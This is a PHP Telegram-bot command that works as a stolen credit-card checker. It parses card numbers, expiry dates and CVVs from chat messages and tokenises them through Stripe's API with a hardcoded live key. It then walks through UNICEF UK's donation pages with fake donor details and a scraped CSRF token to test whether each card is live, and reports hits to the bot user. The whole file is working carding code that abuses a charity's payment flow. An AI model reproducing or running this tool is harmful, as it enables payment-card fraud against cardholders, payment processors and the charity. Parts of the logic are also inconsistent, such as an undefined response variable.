<?php

/*

///==[Stripe User Merchant Commands]==///

/schk creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>Chala Ja Bsdk</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);

        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];


            $bin = substr($cc, 0, 6);

            ###CHECKER PART###
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");


            /////////////////////==========[Unavailable if empty]==========////////////////


            if (empty($schemename)) {
                $schemename = "Unavailable";
            }
            if (empty($typename)) {
                $typename = "Unavailable";
            }
            if (empty($brand)) {
                $brand = "Unavailable";
            }
            if (empty($bank)) {
                $bank = "Unavailable";
            }
            if (empty($cname)) {
                $cname = "Unavailable";
            }
            if (empty($phone)) {
                $phone = "Unavailable";
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'Host: api.stripe.com',
              'Accept: application/json',
              'Accept-Language: en-US,en;q=0.9',
              'Content-Type: application/x-www-form-urlencoded',
              'Origin: https://js.stripe.com',
              'Referer: https://js.stripe.com/',
              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[name]=klasjfkj+askljf&billing_details[email]=asdlkfjlkJ%40gmail.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&guid=0c6cdbba-e810-4d66-a89a-9bd836f0c56c83418a&muid=3ab38539-e7a1-4cfd-b79b-3dbdf03fe40cab0b74&sid=27aed0d3-5693-4593-8c25-cc8a7d74320e80b76c&_stripe_account=acct_1FnGBxBVCZ9Tk8l4&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&payment_user_agent=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0%3B+checkout");
            $result1 = curl_exec($ch);

            if(stripos($result1, 'error')){
                $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
                $stripeerror = True;
            }else{
                $id = trim(strip_tags(capture($result1,'"id": "','"')));
                $stripeerror = False;
            }

            if(!$stripeerror){

                ///////////////////////////////--------------REQUEST--1-------------/////////////////////////////////////////

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
                $headers = array();
                $headers[] = 'authority: donate.unicef.org.uk';
                $headers[] = 'method: GET';
                $headers[] = 'scheme: https';
                $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
                $headers[] = 'accept-language: en-US,en;q=0.9';
                $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
                $headers[] = 'sec-ch-ua-mobile: ?0';
                $headers[] = 'sec-ch-ua-platform: "Windows"';
                $headers[] = 'sec-fetch-dest: document';
                $headers[] = 'sec-fetch-mode: navigate';
                $headers[] = 'sec-fetch-site: none';
                $headers[] = 'sec-fetch-user: ?1';
                $headers[] = 'upgrade-insecure-requests: 1';
                $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $roll1 = curl_exec($ch);
                $csrf = trim(strip_tags(capture($roll1,'csrf" value="','"')));
                //// csrf-token


                ///////////////////////////////--------------REQUEST--2-------------/////////////////////////////////////////


$data = "_csrf=$csrf&email=lkadsjflaksdfj%40gamil.com&selectTitle=Mr&firstname=jaklsjf&surname=lkasjdlkj&find=&Line1=B%2C+Priory+Court&Line2=Kingshill+Road&City=Dursley&PostalCode=GL11+4DH&CountryName=United+Kingdom&over18=on&phoneNumber=&warm_audience=&warm_audience_interacted=&fromStage=details";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: donate.unicef.org.uk';
$headers[] = 'method: POST';
$headers[] = 'path: /thankyoufordonating/single/1/donate/details';
$headers[] = 'scheme: https';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://donate.unicef.org.uk';
$headers[] = 'Referer: https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$roll2 = curl_exec($ch);


                ///////////////////////////////--------------REQUEST--3-------------/////////////////////////////////////////


                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/payment');
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
                $headers = array();
                $headers[] = 'authority: donate.unicef.org.uk';
                $headers[] = 'method: GET';
                $headers[] = 'scheme: https';
                $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
                $headers[] = 'accept-language: en-US,en;q=0.9';
                $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
                $headers[] = 'sec-ch-ua-mobile: ?0';
                $headers[] = 'sec-ch-ua-platform: "Windows"';
                $headers[] = 'sec-fetch-dest: document';
                $headers[] = 'sec-fetch-mode: navigate';
                $headers[] = 'sec-fetch-site: none';
                $headers[] = 'sec-fetch-user: ?1';
                $headers[] = 'upgrade-insecure-requests: 1';
                $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $roll3 = curl_exec($ch);
                $tok = trim(strip_tags(capture($roll3, "var btToken", ";")));
                $author = base64_decode($tok);
                $finger = trim(strip_tags(capture($author, 'authorizationFingerprint":"', '"')));

            }
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);

            ###END OF CHECKER PART###


            if(strpos($roll3, 'succeeded')) {
                addTotal();
                addUserTotal($userId);
                addCVV();
                addUserCVV($userId);
                addCCN();
                addUserCCN($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV or CCN ✅
Response -» $result2
Gateway -» 1💲 STRIPE
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/MasterMind_Mikhil'>𝐌𝐚𝐬𝐭𝐞𝐫𝐌𝐢𝐧𝐝</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'

              ]);
            }
            elseif($roll3 == null && !$stripeerror) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» API Down ❌
Response -» $result2
Gateway -» 1 Charge
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/MasterMind_Mikhil'>𝐌𝐚𝐬𝐭𝐞𝐫𝐌𝐢𝐧𝐝</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'

              ]);
            }
            else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Declined! ❌
Response -» $tok |csrf - $csrf
Decline Error -» roll 2 - $roll2 | roll3 - $roll3
Result -» $finger
Gateway -» 1💲 STRIPE
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/MasterMind_Mikhil'>𝐌𝐚𝐬𝐭𝐞𝐫𝐌𝐢𝐧𝐝</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'

              ]);
            }

        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'

            ]);
        }
    }
}


?>
